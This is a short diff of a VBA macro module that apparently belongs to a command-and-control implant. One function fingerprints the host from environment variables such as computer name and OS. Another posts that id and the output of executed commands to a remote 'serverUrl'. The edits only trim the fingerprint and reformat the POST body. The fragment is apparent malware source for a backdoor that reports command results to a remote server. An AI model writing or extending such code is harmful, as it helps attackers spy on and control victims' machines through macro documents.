@@ -40,7 +40,7 @@ End Function
 Private Function GetId() As String
     Dim myInfo As String
     Dim myID As String
-    myID = Environ("COMPUTERNAME") & " " & Environ("OS") & " " & Environ("PROCESSOR_IDENTIFIER")
+    myID = Environ("COMPUTERNAME") & " " & Environ("OS") 
     GetId = myID
 End Function
 
@@ -48,7 +48,7 @@ End Function
 Private Function SendResponse(cmdOutput)
     Dim data As String
     Dim response As String
-    data = "id=" & GetId & vbCrLf & "&cmdOutput=" & vbCrLf & cmdOutput
+    data = "id=" & GetId & "&cmdOutput=" & cmdOutput
     SendResponse = HttpPostData(serverUrl, data)
 End Function
 
